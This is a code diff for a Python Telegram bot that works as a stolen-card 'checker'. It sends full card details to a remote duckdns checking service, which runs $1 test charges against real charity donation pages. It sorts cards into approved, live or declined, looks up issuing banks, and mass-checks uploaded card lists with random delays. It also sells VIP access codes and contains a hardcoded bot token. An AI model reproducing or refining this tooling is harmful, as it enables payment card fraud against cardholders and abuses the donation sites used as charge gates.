@@ -14,10 +14,10 @@ TOKEN = '8689698569:AAF6GOOcFdsTnG_UXXHLqWkis0bCsIFsQJQ'
 
 # ------------------- Users -------------------
 
-ADMINS = [6843321125]
-VIP_USERS = {}
-BANNED_USERS = {}
-ALL_USERS = set()
+ADMINS = [6843321125]  # ضع هنا ID الأدمن
+VIP_USERS = {}       # {user_id: expiration_timestamp}
+BANNED_USERS = {}    # {user_id: True}
+ALL_USERS = set()    # كل مستخدم دخل البوت
 stop_users = {}
 last_check_time = {}
 ANTI_SPAM_SECONDS = 7
@@ -28,12 +28,12 @@ GATES = [
     "https://raybensch.com/donations/support-ray/",
     "https://www.wfft.org/donations/general-donation/"
 ]
-
+gate_index = 0
 api_semaphore = asyncio.Semaphore(6)
 
 # ------------------- Codes -------------------
 
-CODES = {}
+CODES = {}  # {"WAFA-XXXX-XXXX-XXXX": {"duration":7, "max_users":5, "used":0, "created":timestamp}}
 
 # ------------------- BIN Lookup -------------------
 
@@ -43,126 +43,85 @@ async def get_bin_info(bin_number):
         f"https://bins.antipublic.cc/bins/{bin_number}",
         f"https://bincheck.io/api/{bin_number}"
     ]
-
-    info = None
-    bank = None
-    country = None
-    emoji = None
-    currency = None
-
-    for url in urls:
-        try:
-            async with httpx.AsyncClient(timeout=8) as client:
-                r = await client.get(url)
-
-                if r.status_code != 200:
-                    continue
-
-                data = r.json()
-
-                if not info:
-                    scheme = data.get("scheme") or data.get("brand") or data.get("type")
+    for attempt in range(3):
+        for url in urls:
+            try:
+                async with httpx.AsyncClient(timeout=10) as client:
+                    r = await client.get(url)
+                    if r.status_code != 200:
+                        continue
+                    data = r.json()
+                    brand = data.get("scheme") or data.get("brand") or data.get("type")
                     card_type = data.get("type") or data.get("card_type")
-                    brand = data.get("brand") or data.get("scheme") or data.get("type")
-
-                    if scheme or card_type or brand:
-                        info = f"{scheme or 'Unknown'} - {card_type or 'Unknown'} - {brand or 'Unknown'}"
-
-                if not bank:
-                    b = data.get("bank", {})
-
-                    if isinstance(b, dict):
-                        bank = b.get("name")
-                    else:
-                        bank = b
-
+                    bank = (
+                        data.get("bank", {}).get("name")
+                        if isinstance(data.get("bank"), dict)
+                        else data.get("bank")
+                    )
+                    country = (
+                        data.get("country", {}).get("name")
+                        if isinstance(data.get("country"), dict)
+                        else data.get("country")
+                    )
                     if not bank:
                         bank = data.get("issuer") or data.get("bank_name")
-
-                if not country:
-                    c = data.get("country", {})
-
-                    if isinstance(c, dict):
-                        country = c.get("name")
-                        emoji = c.get("emoji", "🏳️")
-                        currency = c.get("currency", "UNK")
-                    else:
-                        country = c
-                        emoji = "🏳️"
-                        currency = "UNK"
-
-        except Exception:
-            continue
-
-    return {
-        "info": info or "Unknown - Unknown - Unknown",
-        "bank": bank or "Unknown",
-        "country": f"{country or 'Unknown'} {emoji or '🏳️'} - [{currency or 'UNK'}]"
-    }
+                    if not country:
+                        country = data.get("country_name")
+                    if brand or bank or country:
+                        return (
+                            f"{brand or 'Unknown'} - {card_type or 'Unknown'}",
+                            bank or "Unknown",
+                            country or "Unknown"
+                        )
+            except:
+                continue
+        await asyncio.sleep(0.5)
+    return "Unknown", "Unknown", "Unknown"
 
 # ------------------- Check API -------------------
 
 async def check_card_api(card_full):
-    gate = random.choice(GATES)
-    params = {
-        "url": gate,
-        "card": card_full,
-        "amount": 1.00
-    }
-
+    global gate_index
+    gate = GATES[gate_index]
+    gate_index = (gate_index + 1) % len(GATES)
+    params = {"url": gate, "card": card_full, "amount": 1.00}
     async with api_semaphore:
         try:
             async with httpx.AsyncClient(timeout=20) as client:
-                r = await client.get(
-                    "http://Gatecheck.duckdns.org:7000/check",
-                    params=params
-                )
-
-                result_raw = r.json().get("result", "")
+                r = await client.get("http://gatescheck.duckdns.org:7000/check", params=params)
+                result_raw = r.json().get('result','')
                 result = result_raw.lower()
-
                 if "charge" in result or "success" in result:
                     return "approved", result_raw
                 elif "insufficient" in result:
                     return "live", result_raw
                 else:
                     return "declined", result_raw
-
-        except Exception:
+        except:
             return "declined", "Error"
 
 # ------------------- Format Response -------------------
 
-async def format_response(card_full, status, response, taken, mode="single"):
+async def format_response(card_full, status, response, taken):
     bin_number = card_full.split("|")[0][:6]
-    bin_data = await get_bin_info(bin_number)
-
-    info = bin_data["info"]
-    bank = bin_data["bank"]
-    country = bin_data["country"]
-
-    if mode == "single":
-        title = "#PayPal_Charge ($1) [single] 🌟"
+    info, bank, country = await get_bin_info(bin_number)
+    if status == "approved":
+        title = "#Charge ✅"
+    elif status == "live":
+        title = "#Live 🟢"
     else:
-        title = "#PayPal_Charge ($1) [mass] 🌟"
+        title = "#Declined ❌"
+    return f"""{title}
 
-    return (
-        f"{title}\n"
-        "- - - - - - - - - - - - - - - - - - - - - -\n"
-        f"[ϟ] 𝐂𝐚𝐫𝐝: {card_full}\n"
-        f"[ϟ] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {response}\n"
-        f"[ϟ] 𝐒𝐭𝐚𝐭𝐮𝐬: {status.upper()}\n"
-        f"[ϟ] 𝐓𝐚𝐤𝐞𝐧: {taken}s\n"
-        "- - - - - - - - - - - - - - - - - - - - - -\n"
-        f"[ϟ] 𝐈𝐧𝐟𝐨: {info}\n"
-        f"[ϟ] 𝐁𝐚𝐧𝐤: {bank}\n"
-        f"[ϟ] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}\n"
-        "- - - - - - - - - - - - - - - - - - - - - -\n"
-        f"[⌥] 𝐓𝐢𝐦𝐞: {taken}s\n"
-        "[⎇] 𝐑𝐞𝐪 𝐁𝐲: VIP\n"
-        "- - - - - - - - - - - - - - - - - - - - - -\n"
-        "[⌤] 𝐃𝐞𝐯 𝐛𝐲: Wafa - 🍀"
-                    )
+💳 Card: {card_full}
+📨 Response: {response}
+
+🏦 Info: {info}
+🏛 Bank: {bank}
+🌍 Country: {country}
+
+⏱ Time: {taken}s
+"""
 
 # ------------------- Permissions -------------------
 
@@ -204,7 +163,7 @@ async def process_pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
     start_time = time.time()
     status, response = await check_card_api(card_full)
     taken = round(time.time()-start_time,2)
-    text = await format_response(card_full, status, response, taken, "single")
+    text = await format_response(card_full, status, response, taken)
     await update.message.reply_text(text)
 
 # ------------------- /stop -------------------
@@ -248,11 +207,11 @@ async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         status,response = await check_card_api(card_full)  
         await asyncio.sleep(random.uniform(1,5))  
         taken = round(time.time()-start_time,2)  
-        text = await format_response(card_full,status,response,taken,"mass")  
+        text = await format_response(card_full,status,response,taken)  
         if status=="approved": approved+=1; await update.message.reply_text(text)  
         elif status=="live": live+=1; await update.message.reply_text(text)  
         else: declined+=1  
-        last_info,last_bank,last_country = (await get_bin_info(card_full.split("|")[0][:6])).values()
+        last_info,last_bank,last_country = await get_bin_info(card_full.split("|")[0][:6])  
         panel = f"""📊 Status
 
 ✅ Charge: {approved} 💥
@@ -264,8 +223,8 @@ async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
 💳 Last Card: {card_full}
 📨 Response: {response}
 🏦 Info: {last_info}
-🌍 Bank: {last_bank}
-📌 Country: {last_country}
+🏛 Bank: {last_bank}
+🌍 Country: {last_country}
 📌 Status: {status}
 ━━━━━━━━━━━━━━━
 
@@ -281,12 +240,11 @@ async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     with open(results_file_path,'w',encoding='utf-8') as result_file:  
         for line in lines:  
-            r = await format_response(line.strip(),"N/A","N/A",0,"mass")  
+            r = await format_response(line.strip(),"N/A","N/A",0)  
             result_file.write(r+"\n\n")  
     await update.message.reply_text(f"Done ✅\nResults saved: {results_file_path}")
 
-# ------------------- /try -------------------
-
+# 🔥 إضافة /try فقط
 async def try_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id not in ADMINS:
         return
